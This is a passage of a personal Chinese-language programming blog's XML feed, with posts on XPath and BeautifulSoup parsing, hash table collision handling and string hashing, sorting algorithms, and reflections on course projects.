打印&lt;li&gt;标签的元素集合</span></span><br></pre></td></tr></table></figure></li><li><p>获取所有li元素下的所有class属性的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下href为<code>www.baidu.com</code>的a标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a[@href=&quot;www.baidu.com&quot;]&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下所有span标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment">#result = html.xpath(&#x27;//li/span&#x27;)</span></span><br><span class="line"><span class="comment">#注意这么写是不对的：</span></span><br><span class="line"><span class="comment">#因为 / 是用来获取子元素的，而 &lt;span&gt; 并不是 &lt;li&gt; 的子元素，所以，要用双斜杠</span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li//span&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下的a标签里的所有class：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a//@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取最后一个li的a的href属性对应的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()]/a/@href&#x27;</span>)</span><br><span class="line"><span class="comment"># 谓语 [last()] 可以找到最后一个元素</span></span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取倒数第二个li元素的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># text 方法可以获取元素内容</span></span><br><span class="line"><span class="built_in">print</span>(result[<span class="number">0</span>].text)</span><br></pre></td></tr></table></figure></li><li><p>获取倒数第二个li元素的内容的第二种方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a/text()&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ol><h2 id="BeautifulSoup4库"><a href="#BeautifulSoup4库" class="headerlink" title="BeautifulSoup4库"></a>BeautifulSoup4库</h2><p>使用流程：</p><ol><li>根据标签名进行获取节点</li><li>获取文本内容和属性</li></ol><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><blockquote><p>soup.a.attrs   返回一字典，里面是所有属性和值<br> soup.a[‘href’] 获取href属性</p></blockquote><h3 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h3><blockquote><p><strong>soup.a.string</strong><br> <strong>soup.a.text</strong><br> <strong>soup.a.get_text()</strong><br> 【注】当标签里面还有标签的时候，string获取的为None，其他两个获取纯文本内容</p></blockquote><h4 id="find方法"><a href="#find方法" class="headerlink" title="find方法"></a>find方法</h4><blockquote><p><strong>soup.find(‘a’)</strong><br> <strong>soup.find(‘a’, class_=’xxx’)</strong><br> <strong>soup.find(‘a’, title=’xxx’)</strong><br> <strong>soup.find(‘a’, id=’xxx’)</strong><br> <strong>soup.find(‘a’, id=re.compile(r’xxx’))</strong><br> 【注】find只能找到符合要求的第一个标签，他返回的是一个对象</p></blockquote><h3 id="find-all方法"><a href="#find-all方法" class="headerlink" title="find_all方法"></a>find_all方法</h3><blockquote><p>返回一个列表，列表里面是所有的符合要求的对象<br> <strong>soup.find_all(‘a’)</strong><br> <strong>soup.find_all(‘a’, class_=’wang’)</strong><br> <strong>soup.find_all(‘a’, id=re.compile(r’xxx’))</strong><br> <strong>soup.find_all(‘a’, limit=2)</strong>   提取出前两个符合要求的a</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Crawler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ALU Reflection</title>
      <link href="/2021/10/15/ALU%20Reflection/"/>
      <url>/2021/10/15/ALU%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1 id="ALU-Reflection"><a href="#ALU-Reflection" class="headerlink" title="ALU Reflection"></a>ALU Reflection</h1><h2 id="一、-实现过程中的bug"><a href="#一、-实现过程中的bug" class="headerlink" title="一、 实现过程中的bug"></a>一、 实现过程中的bug</h2><ol><li>char 与 int 的转换老是忘记……</li><li>减法参数传反了（主要是顺序不符合正常逻辑</li><li>字符串相等用 equals</li></ol><h2 id="二、-反思"><a href="#二、-反思" class="headerlink" title="二、 反思"></a>二、 反思</h2><ol><li>代码没有经过充分的测试前，都是错误的，在后面调用前面未测试的模块只会增加调试的麻烦。</li><li>多使用assert尽早发现问题</li><li>左移右移用的蛮多的，应该抽象为函数，重复了好多次</li></ol><h2 id="三、-收获"><a href="#三、-收获" class="headerlink" title="三、 收获"></a>三、 收获</h2><ol><li><p>恢复除法存在的bug，即被除数为负与除数恰好相加为0是，被判定为异号不够除，但实际是够的。<br>解决方法：可以到最后调整余数与商。</p></li><li><p>自己写测试用例，将int最大最小值，0，正负相乘等边界情况做测试，也可以写random</p></li><li><p>char数组转String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.valueOf (Arrays.copyOfRange (arr, i, j))</span><br><span class="line">String.valueOf (Arrays.copyOf (arr, Length))</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随笔</title>
      <link href="/2021/09/25/21.09.25%E9%9A%8F%E7%AC%94/"/>
      <url>/2021/09/25/21.09.25%E9%9A%8F%E7%AC%94/</url>
      
        <content type="html"><![CDATA[<p>游戏被封禁，我没有说话，我成年了；没想到刀这么快就落到日漫上了<br>历史将记取的社会转变的最大悲剧不是坏人的喧嚣，而是好人的沉默。——马丁路德金<br>沉默的人数越多，打破沉默就越难，因为当越来越多的人卷入沉默的漩涡，从这个漩涡中挣脱出来，需要的力气就越大。<br>房间里的大象愈发膨胀，一步步挤压着每一个人，我在这个房间里又能做些什么呢，大概唯有感恩</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希</title>
      <link href="/2021/09/03/%E5%93%88%E5%B8%8C/"/>
      <url>/2021/09/03/%E5%93%88%E5%B8%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h1><p>哈希表就是集查找、插入和删除于一身的一种数据结构（算法题里一般只有插入和删除操作）。哈希的过程就是把一个大的数据范围映射到一个较小的数据范围内的过程，这一点跟离散化很像，可以把<strong>离散化</strong>看成极其特殊的哈希方式。</p><p>因为数据量很大，哈希表难免会出现碰撞，就是把两个不一样的数映射成一样的数，key1 ！= key2 ，hash（key1） == hash（key2）这种情况，所以我们要避免冲突。</p><h2 id="处理冲突的方法"><a href="#处理冲突的方法" class="headerlink" title="处理冲突的方法"></a>处理冲突的方法</h2><p>以下题为例：</p><blockquote><p>维护一个集合，支持如下几种操作：</p><p>I x，插入一个数 x（−10^9^ ≤ x ≤ 10^9^）；<br>Q x，询问数 x 是否在集合中出现过；<br>现在要进行 N （1 ≤ N ≤ 10^5^）次操作，对于每个询问操作输出对应的结果。</p><p>输入格式<br>第一行包含整数 N，表示操作数量。</p><p>接下来 N 行，每行包含一个操作指令，操作指令为 I x，Q x 中的一种。</p><p>输出格式<br>对于每个询问指令 Q x，输出一个询问结果，如果 x 在集合中出现过，则输出Yes，否则输出 No。</p></blockquote><h3 id="1-拉链法——数组与链表的结合"><a href="#1-拉链法——数组与链表的结合" class="headerlink" title="1.拉链法——数组与链表的结合"></a>1.拉链法——数组与链表的结合</h3><p>假设我们刚开始将11映射到3的位置上，我们就在3的位置处拉出一个链，将11加进去；倘若第二次映射，23也映射到了3的位置，我们就继续把23加进去。这种处理冲突的方法就是拉链法。</p><p><img src="https://i.loli.net/2021/09/03/XE91BtfRzTClrLZ.png" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">    Link link = <span class="keyword">new</span> <span class="built_in">Link</span>(data);</span><br><span class="line">    <span class="keyword">int</span> key = link.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in">insert</span>(link);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Link <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">return</span> array[hashVal].<span class="built_in">find</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in"><span class="keyword">delete</span></span>(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-开放寻址法"><a href="#2-开放寻址法" class="headerlink" title="2.开放寻址法"></a>2.开放寻址法</h3><p>基本思路比较容易理解就是只在一个数组中进行操作，防止溢出范围一般要开到题目范围的2-3倍。</p><p>假如我们求出的哈希值hash（x） == k，我们就在一个数组从第k个位置开始，如果该位置被占用，则依次看下一个位置，直到找到空位置为止。</p><p>找下一个位置也有不同的方法</p><h4 id="线性探测"><a href="#线性探测" class="headerlink" title="线性探测"></a><strong>线性探测</strong></h4><p>插入思路很朴素：下标一位一位后移，直到为空。查找同理，先算得理论下标，向后逐位比对，若遍历至空位，说明没有。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        <span class="comment">// 如果超过数组大小，则从第一个开始找</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null)&#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key)&#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线性探测哈希表的删除相对来说比较复杂一点，我们不能简单的把这一项数据删除，让它变成空，为什么呢？</p><p>线性探测哈希表在查找的时候，一旦我们通过线性探测方法，找到一个空闲位置，我们就可以认定哈希表中不存在这个数据。但是，如果这个空闲位置是我们后来删除的，就会<strong>导致原来的查找算法失效</strong>。本来存在的数据，会被认定为不存在。</p><p>因此我们需要一个<strong>特殊的数据</strong>来顶替这个被删除的数据，因为我们的学生学号都是正数，所以我们用学号等于<code>-1</code>来代表被删除的数据。这样会带来一个问题，如何在线性探测哈希表中做了多次操作，会导致哈希表中充满了学号为<code>-1</code>的数据项，使的哈希表的效率下降，所以很多哈希表中没有提供删除操作，即使提供了删除操作的，也尽量少使用删除函数。</p><h4 id="二次探测"><a href="#二次探测" class="headerlink" title="二次探测"></a><strong>二次探测</strong></h4><p>在线性探测哈希表中，数据会发生聚集，一旦聚集形成，它就会变的越来越大，那些哈希函数后落在聚集范围内的数据项，都需要一步一步往后移动，并且插入到聚集的后面，因此聚集变的越大，聚集增长的越快。这个就像我们在逛超市一样，当某个地方人很多时，人只会越来越多，大家都只是想知道这里在干什么。</p><p>二次探测是防止聚集产生的一种尝试，思想是探测相隔较远的单元，而不是和原始位置相邻的单元。在线性探测中，如果哈希函数得到的原始下标是x,线性探测就是x+1,x+2,x+3……，以此类推，而在二次探测中，探测过程是x+1,x+4,x+9,x+16,x+25……,以此类推，到原始距离的步数平方</p><h4 id="双哈希（常用）"><a href="#双哈希（常用）" class="headerlink" title="双哈希（常用）"></a><strong>双哈希</strong>（常用）</h4><p>双哈希是为了消除原始聚集和二次聚集问题，不管是线性探测还是二次探测，每次的探测步长都是固定的。双哈希是除了第一个哈希函数外再增加一个哈希函数用来根据关键字生成探测步长，这样即使第一个哈希函数映射到了数组的同一下标，但是探测步长不一样，这样就能够解决聚集的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="comment">// 获取步长</span></span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        <span class="comment">// 如果超过数组大小，则从第一个开始找</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            Student temp = array[hashVal];</span><br><span class="line">            array[hashVal] = noStudent;</span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双哈希的实现比较简单，但是双哈希有一个特别高的要求就是表的容量需要是一个质数，为什么呢？</p><p><strong>为什么双哈希需要哈希表的容量是一个质数？</strong></p><p>假设我们哈希表的容量为15，某个<strong>「关键字」</strong>经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,0,5,10，一直只会尝试这三个位置，永远找不到空白位置来存放，最终会导致崩溃。</p><p>如果我们哈希表的大小为13，某个<strong>「关键字」</strong>经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,2,7,12,4,9,1,6,11,3。会查找到哈希表中的每一个位置。</p><p>使用开放地址法，不管使用那种策略都会有各种问题，开放地址法不怎么使用，在开放地址法中使用较多的是双哈希策略。</p><h2 id="字符串哈希"><a href="#字符串哈希" class="headerlink" title="字符串哈希"></a>字符串哈希</h2><p>通过比对字符串的哈希值的方法快速判断两个字符串是否相同，操作及思路比KMP方法简单。</p><h3 id="求字符串前缀的哈希值"><a href="#求字符串前缀的哈希值" class="headerlink" title="求字符串前缀的哈希值"></a>求字符串前缀的哈希值</h3><p>将一个字符串看成一个P进制的数，最后转化成10进制数</p><p>假如我们要求一个字符串ABCD的哈希值，ABCD对应1234</p><p>A    B    C    D<br>1    2    3    4<br>我们要求的就是字符串的前缀哈希值<br>h[0] = 0<br>h[1] = ‘A’的哈希值<br>h[2] = ‘AB’的哈希值<br>h[3] = ‘ABC’的哈希值<br>h[4] = ‘ABCD’的哈希值</p><p>ABCD的哈希值 h[4] =（1234）p = 1 <em> P3 + 2 </em> P 2 + 3 <em> P1 + 4 </em> P0</p><p>因为转化后的数字可能很大，所以我们要对所求的哈希值对Q取模</p><p>通过这样一种方式就可以把任意一个字符串映射成一个0~Q-1的数了</p><p>注意：<br>1.不能将字母映射成0，一般从1开始映射，不然会使不同的字符串的哈希值相同</p><p>2.有这样一组经验值，当P = 131 或 13331 Q = 264，且我们不那么非，在99.99%的情况下不存在冲突，<del>这可不是我说的</del></p><p>3.因为Q = 264，所以我们用unsigned long long来存储所有的哈希值，就不需要对Q取模了。因为会溢出，所以就等价于取模了</p><h3 id="求任意字串的哈希值"><a href="#求任意字串的哈希值" class="headerlink" title="求任意字串的哈希值"></a>求任意字串的哈希值</h3><p>我们可以利用我们所求得的前缀哈希用一个公式算出来任意一个子串的哈希值</p><p>假设我们已知两个前缀哈希值h[R],h[L - 1], 目标是求得L~R的哈希值</p><p>即h[L~R] = h[R] -h[L-1] * PR-L+1</p><p>证明过程如下：</p><p>h[R] = 1 <em> PR-1 + 2 </em> PR-2 + …+ R <em> P0<br>h[L-1] = 1 </em> PL-2 + 2 <em> PL-2 + …+ (L-1) </em> P0<br>要求的L~R的哈希值， 我们需要将h[L-1] <em> PR-L+1 = 1 </em> PR-1 + 2 <em> PR-2 + …+ (L-1) </em> PR-L+1<br>h[L~R] = L <em> PR-L + (L+1) </em> PR-L-1 + …+ R <em> P0 = h[R] - h[L-1] </em> PR-L+1</p><p>其实本质就是进制转换</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TM Reflection</title>
      <link href="/2021/07/23/TM%20Reflection/"/>
      <url>/2021/07/23/TM%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1 id="TM-Reflection"><a href="#TM-Reflection" class="headerlink" title="TM Reflection"></a>TM Reflection</h1><p>这是第二次图灵机大作业完成后的反思与总结，将分为如下几部分：</p><ul><li>架构的反思</li><li>debug的过程</li></ul><h2 id="架构的反思"><a href="#架构的反思" class="headerlink" title="架构的反思"></a>架构的反思</h2><p>1.TuringMachine的构造函数过于复杂，夹杂了许多功能，可创建Util工具类，使代码低耦合，数据与职责一致</p><p>2.Q, State,TransitionFuction之间的映射关系要理清，是个不错的架构，值得学习</p><p>3.对于Executor，它拥有的是Tapes，因此他的快照等功能应该是调用Tape的方法来“拼凑”实现整体，而不应该在Executor中调用到Tracks层面</p><h2 id="debug的过程"><a href="#debug的过程" class="headerlink" title="debug的过程"></a>debug的过程</h2><p>1.第一次运行，什么错误信息都没有，什么输出都没有，合理推测问题在Execute方法，处理了一系列格式化问题，都怪猪脚需求写的不清楚（拍桌子）</p><p>发现需要知道空格符号，使我下定了改为自顶而下架构的决心，Executor没有理由需要知道B是什么符号，一次重构，费了点时间，但也算有收获</p><p>2.肉眼对比输出结果的我像个憨批，下次丕定（</p><p>3.第二次运行，发现多报了错误流信息，居然把String直接扔到Character集合中了，我当时怕是写傻了</p><p>4.顺手把错误检查全过了，Resolver判断是否冲突需要对上文所说两重映射完全理解</p><p>5.最后一出错点，挂掉我4个用例，居然是很浅显的错误，移动磁头（我一直很相信你的啊喂……），再一次警告自己不要乱复制</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法整理</title>
      <link href="/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/"/>
      <url>/2021/07/23/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><p>对各类排序方法整理如下：</p><div class="table-container"><table><thead><tr><th><strong>排序算法</strong></th><th><strong>时间复杂度</strong></th></tr></thead><tbody><tr><td>归并排序</td><td>Ο(nlog2n)</td></tr><tr><td>快速排序</td><td>极端Ο(n2)，最好Ο(nlog2n)</td></tr><tr><td>堆排序</td><td>Ο(n)</td></tr><tr><td>计数排序</td><td>O(n+k),k为整数的范围</td></tr><tr><td>基数排序</td><td><strong>Ο((n + k) *d)</strong> ，n指<strong>分配</strong>n个数要n次，k指<strong>构建k个桶</strong>，d为位数**)</td></tr></tbody></table></div><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a><strong>归并排序</strong></h2><p>如下图，假设要对长度为n的数列A进行排序，归并排序的思想就是<strong>Divide&amp;Conquer</strong>分开并克服，首先将A着半拆分为左数列L和有数列R，然后分别对L和R进行各自的排序，最后进行L和R的合并操作。</p><p><img src="https://img2020.cnblogs.com/blog/1820479/202004/1820479-20200403104649348-448131316.png" alt="img"></p><p>在该课程里，讲师提到了归并排序用的是一种叫<strong>Two Fingers双指算法</strong>，这里我用上图的列子进行讲述：</p><ol><li>如果数列a为[20,13,7,2,12,11,9,1]，将它折半拆为左数列L：[20,13,7,2]，右数列R：[12, 11, 9, 1];</li><li>对数列L和R各自进行排序，方法用冒泡排序或其他排序手段都行;</li><li>之后用箭头（指代手指）指向数列L和R最小的元素，进行比较，并先输出这个最小的元素，如上图就是min(1,2)=1。</li><li>之后在该最小元素下移动箭头至下一个元素，将其与原来另一个数列元素进行比较，如上图就是数列R的箭头移至9, 数列L由于上一步不是最小值，所以箭头不变，则对比箭头所指元素的到min(2, 9)=2，输出结果。重复上述操作箭头到达各自数列末尾。</li></ol><p>如下图所示，这里复杂度为<strong>Ο(nlog2n)</strong>。这里可以简单的分为两块：（1）<strong>二路归并需要进行log2n次</strong>；（2）<strong>双指算法对单次二路归并进行n次箭头移动（帮助进行最小值比较操作）</strong>。因此就是nlog2n次。</p><p><img src="http://p.qpic.cn/pic_wework/1948211503/2b2dce38f298729431e797ff2f6ca2260c579caa70c3fb3a/0" alt="img"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 